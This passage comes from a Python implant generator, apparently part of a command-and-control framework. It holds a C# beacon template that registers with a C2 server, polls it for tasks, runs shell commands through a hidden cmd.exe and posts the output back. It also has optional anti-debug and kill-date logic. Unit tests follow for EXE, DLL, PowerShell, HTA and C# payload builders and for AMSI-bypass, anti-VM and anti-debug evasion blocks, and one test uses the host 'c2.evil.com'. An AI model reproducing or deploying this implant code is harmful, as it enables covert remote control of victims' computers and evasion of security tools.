            var json = JsonSerializer.Serialize(meta);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            await _client.PostAsync($"{{BaseUrl}}/api/v1/register", content);
        }}

        public async Task<string> CheckIn()
        {{
            var data = new {{ beacon_id = _beaconId, cmd = "checkin" }};
            var json = JsonSerializer.Serialize(data);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var response = await _client.PostAsync($"{{BaseUrl}}/api/v1/check", content);
            return await response.Content.ReadAsStringAsync();
        }}

        public async Task SubmitResult(string taskId, string result, bool success)
        {{
            var data = new {{ beacon_id = _beaconId, task_id = taskId,
                             result = result, success = success }};
            var json = JsonSerializer.Serialize(data);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            await _client.PostAsync($"{{BaseUrl}}/api/v1/result", content);
        }}

        public async Task ExecuteTask(JsonElement task)
        {{
            var taskId = task.GetProperty("task_id").GetString();
            var command = task.GetProperty("command").GetString();

            try
            {{
                switch (command)
                {{
                    case "shell":
                        var cmd = task.GetProperty("args").GetProperty("cmd").GetString();
                        var psi = new ProcessStartInfo("cmd.exe", $"/c {{cmd}}")
                        {{
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                        }};
                        var proc = Process.Start(psi);
                        var output = await proc.StandardOutput.ReadToEndAsync();
                        output += await proc.StandardError.ReadToEndAsync();
                        await proc.WaitForExitAsync();
                        await SubmitResult(taskId, output, true);
                        break;

                    case "exit":
                        await SubmitResult(taskId, "Exiting", true);
                        Environment.Exit(0);
                        break;

                    default:
                        await SubmitResult(taskId, $"Unknown command: {{command}}", false);
                        break;
                }}
            }}
            catch (Exception ex)
            {{
                await SubmitResult(taskId, ex.Message, false);
            }}
        }}

        public async Task Run()
        {{
            {"// Anti-debug check\n            if (Debugger.IsAttached) Environment.Exit(0);" if self.config.anti_debug else ""}

            await Register();

            int failures = 0;
            while (failures < _config.MaxRetries)
            {{
                // Jittered sleep
                var jitterRange = _config.SleepSeconds * (_config.Jitter / 100.0);
                var actualSleep = _config.SleepSeconds +
                    (_rng.NextDouble() * 2.0 - 1.0) * jitterRange;
                Thread.Sleep((int)(Math.Max(1, actualSleep) * 1000));

                try
                {{
                    var response = await CheckIn();
                    failures = 0;

                    using var doc = JsonDocument.Parse(response);
                    var root = doc.RootElement;

                    if (root.TryGetProperty("tasks", out var tasks))
                    {{
                        foreach (var task in tasks.EnumerateArray())
                        {{
                            await ExecuteTask(task);
                        }}
                    }}
                }}
                catch
                {{
                    failures++;
                }}

                // Kill date
                {"if (!string.IsNullOrEmpty(_config.KillDate) && DateTime.Now > DateTime.Parse(_config.KillDate)) break;" if self.config.kill_date else ""}
            }}
        }}
    }}

    class Program
    {{
        static async Task Main(string[] args)
        {{
            var beacon = new Beacon();
            await beacon.Run();
        }}
    }}
}}
"""
        return source, ".cs"


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestWindowsImplant:
    """Tests for Windows implant generator."""

    def test_gen_exe(self) -> None:
        import tempfile
        config = ImplantConfig(c2_host="10.0.0.1", c2_port=443)
        builder = WindowsImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_exe()
        assert ext == ".c"
        assert "WinMain" in source
        assert "10.0.0.1" in source
        assert config.watermark in source

    def test_gen_dll(self) -> None:
        import tempfile
        config = ImplantConfig()
        builder = WindowsImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_dll()
        assert "DllMain" in source
        assert "DllRegisterServer" in source

    def test_gen_powershell(self) -> None:
        import tempfile
        config = ImplantConfig(c2_host="c2.evil.com", c2_port=8443)
        builder = WindowsImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_powershell()
        assert ext == ".ps1"
        assert "Invoke-CheckIn" in source
        assert "Invoke-Register" in source
        assert "Invoke-Task" in source

    def test_gen_hta(self) -> None:
        import tempfile
        config = ImplantConfig()
        builder = WindowsImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_hta()
        assert ext == ".hta"
        assert "HTA:APPLICATION" in source

    def test_gen_csharp(self) -> None:
        import tempfile
        config = ImplantConfig()
        builder = WindowsImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_csharp()
        assert ext == ".cs"
        assert "class Beacon" in source
        assert "Register" in source

    def test_evasion_blocks(self) -> None:
        import tempfile
        config = ImplantConfig(anti_debug=True, anti_vm=True, amsi_bypass=True)
        builder = WindowsImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        init = builder._evasion_init_c()
        assert "_forge_check_debugger" in init
        assert "_forge_check_sandbox" in init
        assert "_forge_bypass_amsi" in init
